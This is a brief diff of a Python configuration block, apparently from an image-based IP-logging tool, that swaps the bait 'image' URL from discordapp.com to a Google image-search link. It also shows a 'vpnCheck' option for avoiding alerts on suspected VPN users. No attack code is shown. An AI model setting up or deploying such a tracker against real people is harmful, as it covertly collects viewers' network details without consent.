@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     
-    "image": "https://discordapp.com",
+    "image": "https://www.google.com/imgres?q=print%20(%22hello%20world%22)&imgurl=https%3A%2F%2Fwww.tutorialgateway.org%2Fwp-content%2Fuploads%2FPython-Program-to-Print-Hello-World-1.png&imgrefurl=https%3A%2F%2Fwww.tutorialgateway.org%2Fsample-python-program-to-print-hello-world%2F&docid=tlkgtD4jPPqVNM&tbnid=BE8amDUO1Hz-pM&vet=12ahUKEwjTpdLe0uSXAxWSQKQEHUIMM4gQnPAOegUIhwEQAA..i&w=737&h=1024&hcb=2&ved=2ahUKEwjTpdLe0uSXAxWSQKQEHUIMM4gQnPAOegUIhwEQAA",
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
                    # 0 = No Anti-VPN
                    # 1 = Don't ping when a VPN is suspected
